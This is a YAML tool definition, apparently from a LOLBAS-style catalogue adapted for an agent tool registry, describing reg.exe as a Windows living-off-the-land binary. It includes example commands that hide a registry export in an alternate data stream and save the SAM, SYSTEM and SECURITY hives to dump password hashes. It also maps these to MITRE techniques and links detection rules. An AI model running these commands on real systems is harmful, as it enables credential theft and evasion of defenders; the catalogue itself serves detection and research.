---
id: windows-credential-reg
namespace: windows:credential:reg
name: reg
description: 'Used to manipulate the registry Located at: C:\Windows\System32\reg.exe;
  C:\Windows\SysWOW64\reg.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- system.file.alternate-data-stream
- credential.dump
platforms:
- windows
risk_level: critical
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - filesystem_write
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- reg
parameters: []
features:
- file-system
- local
- pipes-stdin
- pipes-stdout
- streaming
execution:
  template: reg
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Export the target Registry key and save it to the specified .REG file
    within an Alternate data stream. (Hide/plant registry information in Alternate
    data stream for later use)
  command: reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg
- description: Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes
    and key material (Dump credentials from the Security Account Manager (SAM))
  command: reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak}
    && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak}
references:
- label: cdd2d0d0ec9abb686f0e89306e277b8f
  url: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
- label: ''
  url: https://pure.security/dumping-windows-credentials/
techniques:
- defense-evasion
- credential-access
mitre_ids:
- T1564.004
- T1003.002
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regedit_import_keys.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/attempted_credential_dump_from_registry_via_reg_exe.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_dump_registry_hives.toml
- type: ioc
  description: reg.exe writing to an ADS
install:
- method: choco
  package_name: reg
  commands:
  - choco install reg
---

# reg

reg is a Windows LOLBin. Used to manipulate the registry Located at: C:\Windows\System32\reg.exe; C:\Windows\SysWOW64\reg.exe.
